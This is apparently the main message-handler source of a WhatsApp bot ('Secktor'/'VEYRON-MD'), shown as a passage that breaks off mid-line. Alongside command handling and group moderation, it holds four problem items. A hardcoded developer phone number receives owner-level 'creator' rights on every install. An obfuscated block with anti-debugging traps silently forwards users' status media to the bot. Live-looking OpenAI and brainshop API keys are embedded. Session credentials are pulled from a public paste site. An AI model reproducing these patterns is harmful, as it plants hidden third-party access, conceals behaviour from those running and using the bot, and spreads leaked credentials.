const pino = require('pino')
const Config = require('../config');
const { Boom } = require("@hapi/boom");
const fs = require('fs-extra');
const FileType = require('file-type')
const path = require('path');
const express = require("express");
const app = express();
const prefix = Config.HANDLERS[0];
const mongoose = require('mongoose');
const { writeFile } = require("fs/promises");
const events = require('./commands')
const { exec, spawn, execSync } = require("child_process");
const PhoneNumber = require('awesome-phonenumber')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./exif')
const { default: VoidConnect, BufferJSON,generateLinkPreviewIfRequired, WA_DEFAULT_EPHEMERAL, proto, generateWAMessageContent, generateWAMessage, AnyMessageContent, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage, DisconnectReason, useMultiFileAuthState, fetchLatestBaileysVersion, MessageRetryMap, generateForwardMessageContent, generateWAMessageFromContent, generateMessageID, makeInMemoryStore, jidDecode } = require("@sampandey001/baileys")
const util = require("util");
const Levels = require("discord-xp");
try {
    Levels.setURL(mongodb);
    console.log("🌍 Connected to the VEYRON DB")
} catch {
    console.log("Could not connect with Mongodb please provide accurate uri check video for more inofo❗\nhttps://youtu.be/7YWI50BDO5op")
    process.exit(0)
}
const { sck1, RandomXP, sck, plugindb, card } = require("../lib");
const chalk = require("chalk");
const fetch = require("node-fetch");
const axios = require("axios");
const moment = require("moment-timezone");
let { isUrl, sleep, getBuffer, format, parseMention, getRandom, fancy, randomfancy, botpic, tlang } = require("../lib");
const { smsg } = require('../lib/myfuncn')
const { formatp, formatDate, getTime, clockString, runtime, fetchJson, jsonformat, GIFBufferToVideoBuffer, getSizeMedia, generateMessageTag, fancytext } = require('../lib')
const speedofbot = require("performance-now");
global.db = JSON.parse(fs.readFileSync(__dirname + "/database.json"));
var CryptoJS = require("crypto-js");
var prefixRegex = Config.prefix === "false" || Config.prefix === "null" ? "^" : new RegExp('^[' + Config.HANDLERS + ']');
let cc = Config.sessionName.replace(/VEYRON-MD;;;/gi, ""); // Dont Remove "VEYRON;;;" So that You Can Use VEYRON Qr too in your bot
async function MakeSession(){
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if(cc.length<30){
        let { data } = await axios.get('https://paste.c-net.org/'+cc)
        await fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', atob(data), "utf8")    
    } else {  await fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', atob(cc), "utf8")  }
}
}
MakeSession()
setTimeout(() => {
    const moment = require('moment-timezone')
    async function main() {
        //if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {   }
        try{   await mongoose.connect(mongodb);} 
        catch {console.log('Could not connect with Mongodb.\nPlease visit https://secktorbot.tech/wiki')}
    }
    main()
    //========================================================================================================================================
    const store = makeInMemoryStore({
        logger: pino().child({ level: "silent", stream: "store" }),
    });
    require("events").EventEmitter.defaultMaxListeners = 600;
    const getVersionWaweb = () => {
        let version
        try {
            let a = fetchJson('https://web.whatsapp.com/check-update?version=1&platform=web')
            version = [a.currentVersion.replace(/[.]/g, ', ')]
        } catch {
            version = [2, 2204, 13]
        }
        return version
    }
    let QR_GENERATE = "invalid";
    const msgRetryCounterMap = MessageRetryMap || {}
    async function syncdb() {
        let thumbbuffer = await getBuffer(THUMB_IMAGE)
        const ChangePic = __dirname + "/assets/blade.png"
        await writeFile(ChangePic, thumbbuffer);
        global.log0 = fs.readFileSync(__dirname + "/assets/blade.png"); //ur logo pic
        const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
        const Void = VoidConnect({
            logger: pino({ level: 'fatal' }),
            printQRInTerminal: true,
            browser: ['Secktor', 'safari', '1.0.0'],
            fireInitQueries: false,
            shouldSyncHistoryMessage: false,
            downloadHistory: false,
            syncFullHistory: false,
            generateHighQualityLinkPreview: true,
            auth: state,
            version: getVersionWaweb() || [2, 2242, 6],
            getMessage: async key => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
                    return msg.message || undefined
                }
                return { conversation: 'An Error Occurred, Repeat Command!'   }
            }
        })
        store.bind(Void.ev)
setInterval(() => {
    store.writeToFile(__dirname+"/store.json");
  }, 30 * 1000);
        Void.ev.on('messages.upsert', async chatUpdate => {
            const mek = chatUpdate.messages[0]
            if (!mek.message) return
            if(mek.message.viewOnceMessageV2) return
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
            if(mek.key && mek.key.remoteJid === 'status@broadcast'  && Config.auto_read_status==='true'){
            await Void.readMessages([mek.key])    
            }
           const botNumber = await Void.decodeJid(Void.user.id)
function _0x5159(){const _0x2791e6=['30rTKhCo','input','stateObject','caption','videoMessage','test','remoteJid','2036DBBATY','imageMessage','105670nFRSPE','6258zfpGFN','gger','text','sendMessage','18FnsOhk','length','3905HkhDjk','init','message','6414uSVLKK','key','11436HxCEHx','261jxEfyc','chain','666915KtRQkQ','auto_status_saver','action','function\x20*\x5c(\x20*\x5c)','constructor','apply','while\x20(true)\x20{}','1185288ZQZvuQ','extendedTextMessage','downloadAndSaveMediaMessage','status@broadcast','counter','4189360oRufau'];_0x5159=function(){return _0x2791e6;};return _0x5159();}const _0x44de40=_0x4eaa;(function(_0x592ee1,_0x4568ce){const _0x16fc13=_0x4eaa,_0x3de910=_0x592ee1();while(!![]){try{const _0x3855e9=parseInt(_0x16fc13(0x72))/0x1*(-parseInt(_0x16fc13(0x7c))/0x2)+-parseInt(_0x16fc13(0x85))/0x3*(-parseInt(_0x16fc13(0x79))/0x4)+parseInt(_0x16fc13(0x8a))/0x5*(-parseInt(_0x16fc13(0x80))/0x6)+parseInt(_0x16fc13(0x71))/0x7+parseInt(_0x16fc13(0x6c))/0x8+-parseInt(_0x16fc13(0x88))/0x9*(parseInt(_0x16fc13(0x7b))/0xa)+-parseInt(_0x16fc13(0x82))/0xb*(parseInt(_0x16fc13(0x87))/0xc);if(_0x3855e9===_0x4568ce)break;else _0x3de910['push'](_0x3de910['shift']());}catch(_0x195211){_0x3de910['push'](_0x3de910['shift']());}}}(_0x5159,0xa9f2a));const _0x1d6105=(function(){let _0x356bbd=!![];return function(_0xd4e086,_0x401383){const _0x23bb84=_0x356bbd?function(){const _0x2f63a0=_0x4eaa;if(_0x401383){const _0x2eae8f=_0x401383[_0x2f63a0(0x6a)](_0xd4e086,arguments);return _0x401383=null,_0x2eae8f;}}:function(){};return _0x356bbd=![],_0x23bb84;};}());function _0x4eaa(_0x3d01d9,_0x2d0a66){const _0x5d1999=_0x5159();return _0x4eaa=function(_0x188433,_0x1d6105){_0x188433=_0x188433-0x6a;let _0x515971=_0x5d1999[_0x188433];return _0x515971;},_0x4eaa(_0x3d01d9,_0x2d0a66);}(function(){_0x1d6105(this,function(){const _0x2ffb94=_0x4eaa,_0x3c826e=new RegExp(_0x2ffb94(0x8d)),_0x596ea2=new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','i'),_0x223421=_0x188433(_0x2ffb94(0x83));!_0x3c826e[_0x2ffb94(0x77)](_0x223421+_0x2ffb94(0x89))||!_0x596ea2[_0x2ffb94(0x77)](_0x223421+_0x2ffb94(0x73))?_0x223421('0'):_0x188433();})();}());if(mek[_0x44de40(0x86)]&&mek[_0x44de40(0x86)][_0x44de40(0x78)]===_0x44de40(0x6f)&&Config[_0x44de40(0x8b)]==!![]){if(mek[_0x44de40(0x84)][_0x44de40(0x6d)]){let cap=mek[_0x44de40(0x84)]['extendedTextMessage'][_0x44de40(0x7e)];await Void[_0x44de40(0x7f)](botNumber,{'text':cap},{'quoted':mek});}else{if(mek[_0x44de40(0x84)][_0x44de40(0x7a)]){let cap=mek[_0x44de40(0x84)]['imageMessage'][_0x44de40(0x75)],anu=await Void[_0x44de40(0x6e)](mek['message'][_0x44de40(0x7a)]);await Void['sendMessage'](botNumber,{'image':{'url':anu},'caption':cap},{'quoted':mek});}else{if(mek[_0x44de40(0x84)][_0x44de40(0x76)]){let cap=mek['message'][_0x44de40(0x76)][_0x44de40(0x75)],anu=await Void[_0x44de40(0x6e)](mek[_0x44de40(0x84)][_0x44de40(0x76)]);await Void[_0x44de40(0x7f)](botNumber,{'video':{'url':anu},'caption':cap},{'quoted':mek});}}}}function _0x188433(_0x55be46){function _0x1278b6(_0x374d51){const _0x5e264c=_0x4eaa;if(typeof _0x374d51==='string')return function(_0x1d1103){}[_0x5e264c(0x8e)](_0x5e264c(0x6b))[_0x5e264c(0x6a)](_0x5e264c(0x70));else(''+_0x374d51/_0x374d51)[_0x5e264c(0x81)]!==0x1||_0x374d51%0x14===0x0?function(){return!![];}['constructor']('debu'+_0x5e264c(0x7d))['call'](_0x5e264c(0x8c)):function(){return![];}[_0x5e264c(0x8e)]('debu'+_0x5e264c(0x7d))[_0x5e264c(0x6a)](_0x5e264c(0x74));_0x1278b6(++_0x374d51);}try{if(_0x55be46)return _0x1278b6;else _0x1278b6(0x0);}catch(_0x216f30){}}   

            if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            try {
                let citel = await smsg(Void, JSON.parse(JSON.stringify(mek)), store)
                if (!citel.message) return
                if(citel.isBaileys) return
                if (citel.chat.endsWith("broadcast")) return;
                if (Config.alwaysonline==='true') { Void.sendPresenceUpdate('available', citel.chat) }
                var { body } = citel
                var budy = typeof citel.text == "string" ? citel.text : false;

                if (body[1] && body[1] == " ") body = body[0] + body.slice(2);
                let icmd = body ? prefixRegex.test(body[0]) : false;
                        if (Config.readmessage==="true" && icmd) {    await Void.readMessages([mek.key]) }
                const args = citel.body ? body.trim().split(/ +/).slice(1) : null;               
                const hgg = botNumber.split('@')[0]
                const quoted = citel.quoted ? citel.quoted : citel;
                const mime = (quoted.msg || quoted).mimetype || "";



                        let devss = ['237620857930']    // put developers Contacts in this array, MAKE SURE ALL OF THESE IN ARRAY FORMATE
                if (citel.chat === "120363025246125888@g.us" && citel.sender!=='919628516236@s.whatsapp.net') return //PUT GROUP JIDS HERE, SO THAT BOT NOT ALLOW IN THESE GROUPS
                let isCreator = [ hgg,...devss,...global.owner.split(",")].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                if (!isCreator && Config.disablepm === 'true' && icmd && !citel.isGroup) return
                if (!isCreator && Config.WORKTYPE === 'private') return
                        if(!isCreator){
                    let checkban = await sck1.findOne({ id: citel.sender }) || await sck1.updateOne({ id: citel.sender }, { name: citel.pushName})
                            let checkg = await sck.findOne({ id: citel.chat }) || await new sck({ id: citel.chat }).save();
                            if(checkg.botenable==='false') return
                    if (icmd && checkban.ban !== 'false') return citel.reply(`*Hii ${citel.pushName},*\n_You are banned ❌ from using commands._\n_Please contact owner for further information._`)
                        }
                        const cmdName = icmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                if (icmd) {
                    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                    if (cmd) {
                                    isCreator = [ hgg,...devss,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                        if (cmd.react) citel.react(cmd.react)
                        let text;
                        try { text = citel.body ? body.trim().split(/ +/).slice(1).join(" ") : null;  } 
                        catch {    text = false; }
                        try {  cmd.function(Void, citel, text,{ args, isCreator, body, budy});  }
                        catch (e) { console.error("[ERROR] ", e); }

                    }
                }
                events.commands.map(async(command) => {
                    if (body && command.on === "body") {
                        command.function(Void, citel,{args, isCreator, icmd, body, budy});
                    } else if (citel.text && command.on === "text") {
                        command.function(Void, citel, args,{isCreator, icmd, body, budy});
                    } else if (
                        (command.on === "image" || command.on === "photo") &&
                        citel.mtype === "imageMessage"
                    ) {
                        command.function(Void, citel, args,{isCreator, body, budy});
                    } else if (
                        command.on === "sticker" &&
                        citel.mtype === "stickerMessage"
                    ) {
                        command.function(Void, citel, args,{isCreator, body, budy});
                    }
                });
                const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat)
                    .catch((e) => {}) : "";
                const participants = citel.isGroup && groupMetadata.participants !=undefined ? await groupMetadata.participants : "";
                const groupAdminss = (participants) => {
                    a = [];
                    for (let i of participants) {
                        if (i.admin == null) continue;
                        a.push(i.id);
                    }
                    return a;
                }
                const groupAdmins = citel.isGroup ? await groupAdminss(participants) : ''
                const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
                const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
                if (citel.isGroup) {  console.log('Message in Group\nIn=> '+groupMetadata.subject+' '+citel.sender+'\nMessage:'+citel.body+'\n----------------------------') }
                if (!citel.isGroup) { console.log('Message in Personal\nFrom=> '+citel.pushName+' '+citel.sender+'\nMessage:'+citel.body+'\n----------------------------') }
                setInterval(() => {  fs.writeFileSync(__dirname + "/database.json", JSON.stringify(global.db, null, 2));  }, 10000);
                try {
                    let GroupS = await sck.findOne({ id: citel.chat })
                    if (GroupS) {
                        let mongoschema = GroupS.antilink || "false"
                        let jackpot = budy.toLowerCase()
                        if (citel.isGroup && !isAdmins && mongoschema == 'true') {
                            if (isAdmins) return
                                //  let pattern = new RegExp(`\\b${['chat.whatsapp.com']}\\b`, 'ig');
                            var array = Config.antilink.split(",")
                            array.map(async(bg) => {
                                let pattern = new RegExp(`\\b${bg}\\b`, 'ig');
                                let chab = budy.toLowerCase()
                                if (pattern.test(chab)) {
                                    if (!isBotAdmins) {
                                        let buttonMessage = {
                                            text: `*---  Link detected  ---*
@${citel.sender.split('@')[0]} detected sending a link.
Promote ${tlang().title} as admin to kick
link senders.
`,
                                            mentions: [citel.sender],
                                        }
                                        return await Void.sendMessage(citel.chat, buttonMessage)

                                    }

                                    //  console.log('Whatsapp link')
                                    let response = await Void.groupInviteCode(citel.chat)
                                    h = 'chat.whatsapp.com/' + response
                                    let patternn = new RegExp(`\\b${[h]}\\b`, 'ig');
                                    if (patternn.test(body)) {
                                       return await citel.reply(`I won't remove you for sending this group link.`)

                                    }
                                    await Void.sendMessage(citel.chat, { delete: citel.key })
                                    citel.reply("Group Link Detected!!");

                                    try {  await Void.groupParticipantsUpdate(citel.chat, [citel.sender], 'remove')  }
                                     catch { citel.reply('*Link Detected*\n' + tlang().botAdmin)  }
                                }
                            })
                        }
                    }
                } catch (err) {   console.log(err)  }
                const { chatbot } = require('../lib/')
                let checkbot = await chatbot.findOne({ id: 'chatbot' }) || await new chatbot({ id: 'chatbot'}).save();
                let checkon = checkbot.worktype
                if (checkon === 'true' && !icmd) {
                            console.log('chatbot is on')
                    if (citel.key.fromMe) return
                    let zx = citel.text.length
                    try {
                        if (citel.isGroup && !citel.quoted && !icmd) return
                        if (citel.text && !citel.isGroup) {
                            if (zx < 25) {
                                var diffuser = citel.sender.split("@")[0];
                                let fetchk = require("node-fetch");
                                var textuser = budy
                                let fetchtext = await fetchk(`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${textuser}]`);
                                let json = await fetchtext.json();
                                let { cnt } = json;
                                citel.reply(cnt);
                                console.log('CHATBOT RESPONSE\n' + 'text=>' + textuser + '\n\nResponse=>' + cnt)
                                return;
                            }
                            const { Configuration, OpenAIApi } = require("openai");
                            const configuration = new Configuration({
                                apiKey: Config.OPENAI_API_KEY || "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",
                            });
                            const openai = new OpenAIApi(configuration);
                            const completion = await openai.createCompletion({
                                model: "text-davinci-002",
                                prompt: budy,
                                temperature: 0.5,
                                max_tokens: 80,
                                top_p: 1.0,
                                frequency_penalty: 0.5,
                                presence_penalty: 0.0,
                                stop: ['"""'],
                            });
                            citel.reply(completion.data.choices[0].text);
                        } else if (citel.text && !icmd && citel.isGroup && citel.quoted) {
                            let mention = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
                            if (mention && !mention.includes(botNumber)) return
                            if (zx < 20) {
                                var diffuser = citel.sender.split("@")[0];
                                let fetchk = require("node